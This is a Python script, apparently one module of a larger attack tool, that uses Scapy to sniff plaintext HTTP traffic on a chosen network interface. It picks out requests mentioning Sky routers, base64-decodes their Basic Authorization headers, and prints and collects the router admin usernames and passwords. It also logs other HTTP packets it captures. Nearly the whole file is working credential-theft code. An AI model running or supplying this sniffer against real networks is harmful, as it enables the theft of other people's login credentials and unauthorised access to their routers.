from scapy.all import *
from colorama import Fore, Style
import base64

def pack_cap():
    from scapy.layers.http import HTTPRequest # import HTTP packet
    import subprocess
    e = []
    un = []
    def process_packet(packet):
        global e
        global un
        try:

            """
            This function is executed whenever a packet is sniffed
            """

            show_raw = True
            
            if packet.haslayer(HTTPRequest):
                # if this packet is an HTTP Request
                # get the requested URL
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                # get the requester's IP Address
                ip = packet[IP].src
                # get the request method
                method = packet[HTTPRequest].Method.decode()
                #print(f"\n{GREEN}[#] {ip} Requested {url} with {method}{RESET}")
                #print(packet)
                if packet:
                    data = str(packet)
                    data = data.replace("b","")
                    data = data.replace("'","")
                    if "sky" in data:
                        # print(packet)
                        # input()
                        print("[SNIFF] possible  sky admin login?")
                        # print("decoding...")
                        # print(data)
                        data = data.split("Authorization:")
                        # print(data)
                        # input("HH")
                        r = data[1]
                        r = r.replace("Basic","")
                        r = r.replace(" ","")
                        r = r.replace("\n","")
                        rrr = r.encode('ascii')
                        rr = base64.b64decode(rrr)
                        print(Fore.GREEN)
                        print("[SNIFF] got sky router user and password!")
                        rr = str(rr)
                        rr = rr.replace("b'","")
                        rr = rr.replace('b"','')
                        rr = rr.replace("'","")
                        rr = rr.split('\\')
                        print(rr[0])
                        e.append(rr[0])
                        print("\n")
                        print(Style.RESET_ALL)
                    else:
                        print("[!] unkown http packet")
                        print("[!] displaying...")
                        print(packet)
                        un.append(packet)
                    if show_raw and packet.haslayer(Raw) and method == "POST":
                        # if show_raw flag is enabled, has raw data, and the requested method is "POST"
                        # then show raw
                        #print(f"\n{RED}[#] Some useful Raw data: {packet[Raw].load}{RESET}")
                        pass
        except KeyboardInterrupt:
            return e
        except Exception:
            pass
                #print(Fore.RED)
                #print("[!] Fatal Error Skipping this HTTP request")
                #print(Style.RESET_ALL)
                    
    def sniff_packets(iface=None):
        if iface:
            # port 80 for http (generally)
            # `process_packet` is the callback
            sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
        else:
            # sniff with default interface
            sniff(filter="port 80", prn=process_packet, store=False, )



    subprocess.run("ifconfig", shell=True)
    iface = input("\n[ENTER] enter interface: ")
    print("[SNIFF] running\n\n")
    try:
        sniff_packets(iface)
    except KeyboardInterrupt:
        print("[SNIFF QUIT] displaying all cought logins: ")
        for r in e:
            print(r)
        print("[CTRL+C] press ctrl+c to go back to the main menu")
        input("[ENTER] press enter to see all unkown http data: ")
        print(un)